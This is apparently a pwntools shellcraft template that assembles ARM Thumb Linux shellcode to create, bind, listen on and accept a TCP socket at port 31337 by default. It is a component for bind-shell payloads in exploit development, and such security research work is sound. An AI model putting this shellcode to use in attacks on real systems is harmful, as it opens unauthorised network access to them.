<% from pwnlib.shellcraft import arm, common %>
<% from pwnlib.util.misc import binary_ip, thumb_fixup %>
<% from pwnlib.util.packing import u32 %>
<% from pwnlib.asm import cpp %>
<% from socket import htons %>
<%page args="port=31337"/>
<%docstring>
    listens on specific port in thumb mode

    Args:
        port (int/str): specific port (default: 31337)
</%docstring>
<%
    sockaddr_in       = common.label("sockaddr_in")
    after_sockaddr_in = common.label("after_sockaddr_in")
%>

    .code 16
    movs r0, AF_INET
    movs r1, SOCK_STREAM
    subs r2, r2, r2
    ${thumb_fixup(eval(cpp("SYS_socket", arch = "thumb", os = "linux")))}
    svc 1

    mov r6, r0
    adr r4, ${sockaddr_in}
    ldr r1, [r4]
    subs r2, r2, r2
    push { r1, r2 }
    mov r0, r6
    mov r1, sp
    movs r2, #16
    ${thumb_fixup(eval(cpp("SYS_bind", arch = "thumb", os = "linux")))}
    svc 1

    b ${after_sockaddr_in}

${sockaddr_in}:
    .short AF_INET
    .short ${htons(int(port))}

${after_sockaddr_in}:
    movs r1, #16
    mov r0, r6
    ${thumb_fixup(eval(cpp("SYS_listen", arch = "thumb", os = "linux")))}
    svc 1

    mov r0, r6
    subs r1, r1, r1
    subs r2, r2, r2
    ${thumb_fixup(eval(cpp("SYS_accept", arch = "thumb", os = "linux")))}
    svc 1
